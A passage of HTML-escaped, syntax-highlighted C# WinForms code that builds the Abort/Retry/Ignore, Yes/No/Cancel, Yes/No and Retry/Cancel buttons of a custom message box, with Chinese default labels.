                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Cancel.Select();
            }
            &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;
            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; MessageBoxButtons.AbortRetryIgnore:
            &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; AbortRetryIgnore
            &lt;span&gt;this&lt;/span&gt;.btn_Abort = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Ignore = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.SuspendLayout();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_Abort&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Abort.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Abort.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_Abort&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Abort.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Abort.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;255&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Abort.TabIndex = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Abort.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000003&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;中止(A)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;中止(A)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Abort.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Abort.Click +=&lt;span&gt; btn_Abort_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Abort);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_Retry&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Retry.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_Retry&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;170&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.TabIndex = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000004&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;重试(R)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;重试(R)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Retry.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Click +=&lt;span&gt; btn_Retry_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Retry);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_Ignore&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Ignore.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Ignore.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_Ignore&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Ignore.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Ignore.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;85&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Ignore.TabIndex = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Ignore.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000005&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;忽略(I)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;忽略(I)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Ignore.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Ignore.Click +=&lt;span&gt; btn_Ignore_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Ignore);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.ResumeLayout();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (defaultButton ==&lt;span&gt; MessageBoxDefaultButton.Button1)
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Abort.Select();
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (defaultButton ==&lt;span&gt; MessageBoxDefaultButton.Button2)
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Retry.Select();
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (defaultButton ==&lt;span&gt; MessageBoxDefaultButton.Button3)
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Ignore.Select();
            }
            &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;
            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; MessageBoxButtons.YesNoCancel:
            &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; YesNoCancel
            &lt;span&gt;this&lt;/span&gt;.btn_Yes = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.SuspendLayout();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_Yes&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Yes.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_Yes&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;255&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.TabIndex = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_MessageBoxModel != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Text =&lt;span&gt; _MessageBoxModel.YesButtonText;
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.btn_Yes.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000006&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;是(Y)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;是(Y)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Yes.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Click +=&lt;span&gt; btn_Yes_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Yes);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_No&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_No.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_No&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;170&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.TabIndex = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_MessageBoxModel != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Text =&lt;span&gt; _MessageBoxModel.NoButtonText;
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.btn_No.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000007&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;否(N)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;否(N)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_No.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Click +=&lt;span&gt; btn_No_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_No);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                           &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_Cancel&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;85&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.TabIndex = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_MessageBoxModel != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Text =&lt;span&gt; _MessageBoxModel.CancleButtonText;
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.btn_Cancel.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000002&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;取消(C)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;取消(C)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Cancel.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Click +=&lt;span&gt; btn_Cancel_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Cancel);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.ResumeLayout();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (defaultButton ==&lt;span&gt; MessageBoxDefaultButton.Button1)
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Yes.Select();
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (defaultButton ==&lt;span&gt; MessageBoxDefaultButton.Button2)
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_No.Select();
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (defaultButton ==&lt;span&gt; MessageBoxDefaultButton.Button3)
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Cancel.Select();
            }
            &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;
            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; MessageBoxButtons.YesNo:
            &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; YesNo
            &lt;span&gt;this&lt;/span&gt;.btn_Yes = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.SuspendLayout();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_Yes&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Yes.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_Yes&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;170&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.TabIndex = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_MessageBoxModel != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Text =&lt;span&gt; _MessageBoxModel.YesButtonText;
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.btn_Yes.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000006&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;是(Y)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;是(Y)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Yes.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Yes.Click +=&lt;span&gt; btn_Yes_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Yes);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_No&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_No.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_No&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;85&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.TabIndex = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_MessageBoxModel != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Text =&lt;span&gt; _MessageBoxModel.NoButtonText;
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.btn_No.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000007&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;否(N)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;否(N)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_No.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_No.Click +=&lt;span&gt; btn_No_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_No);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.ResumeLayout();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (defaultButton ==&lt;span&gt; MessageBoxDefaultButton.Button1)
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Yes.Select();
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_No.Select();
            }
            &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;
            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; MessageBoxButtons.RetryCancel:
            &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; RetryCancel
            &lt;span&gt;this&lt;/span&gt;.btn_Retry = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.SuspendLayout();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_Retry&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Retry.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_Retry&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;170&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.TabIndex = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000004&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;重试(R)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;重试(R)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Retry.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Retry.Click +=&lt;span&gt; btn_Retry_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Retry);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_Cancel&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Cancel.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                           &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_Cancel&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
